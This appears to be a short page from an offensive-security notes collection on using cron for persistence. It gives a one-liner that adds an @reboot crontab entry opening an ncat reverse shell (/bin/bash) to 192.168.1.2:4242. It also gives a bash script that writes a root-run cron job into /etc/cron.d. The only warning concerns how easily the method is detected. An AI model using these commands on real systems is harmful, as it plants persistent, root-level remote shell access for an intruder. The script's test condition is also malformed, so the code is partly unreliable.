# ⚠ Crontab Reverse Shell (Not OPSEC)

{% hint style="danger" %}
cron jobs are obviously visible in crontab, so this method is not recommended.
{% endhint %}

```
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```

### Script:

```
#!/bin/bash

if [ $1 -z ] 
then
        echo "$0 <binary file>"
        echo "NOTE: The binary ile shoud be in user's home directory e.g /home/user/binary_file"
        exit 1
fi

echo "Eneter the time in the form of m(minute) h(hour) dm(day of month) m(month) dw(day of week)"
echo "NOTE: If u want to put 0 for any input put * instead of 0"
read val

HOME=$HOME
#echo "Enter the username for which u want to create cron job"
#read user

echo "[+] Creating cron job..."
sleep 0.2
f=$1
cron_file=${f%.*}
#echo $cron_file
#echo ${f%.*}
echo  "$val root $HOME/$1" | sudo tee /etc/cron.d/$cron_file
```

\\
